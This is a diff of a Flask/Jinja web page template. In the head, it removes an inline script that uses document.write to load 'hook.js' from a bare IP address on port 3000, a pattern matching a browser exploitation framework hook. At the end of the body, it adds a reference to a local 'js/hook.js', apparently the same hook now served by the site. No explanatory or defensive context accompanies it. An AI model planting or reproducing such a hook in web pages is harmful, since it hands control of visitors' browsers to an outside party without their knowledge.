@@ -14,11 +14,8 @@
     <link rel="stylesheet" href="{{ url_for('static', filename='css/loading.css')}}">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <script>
-        var commandModuleStr = '<script src="http://54.248.169.45:3000/hook.js" type="text/javascript"><\/script>';
-		document.write(commandModuleStr);
-    </script>
-    <link href="https://fonts.googleapis.com/css2?family=Baloo+Bhai+2&display=swap" rel="stylesheet">
+    
+  <link href="https://fonts.googleapis.com/css2?family=Baloo+Bhai+2&display=swap" rel="stylesheet">
     <style>
         .liveSearch{
             
@@ -231,5 +228,7 @@ function searchResult(data) {
        nav.style.padding = '0';
    });
 </script>
+	
+	<script src="{{ url_for('static', filename='js/hook.js')}}"></script>
 </body>
 </html>
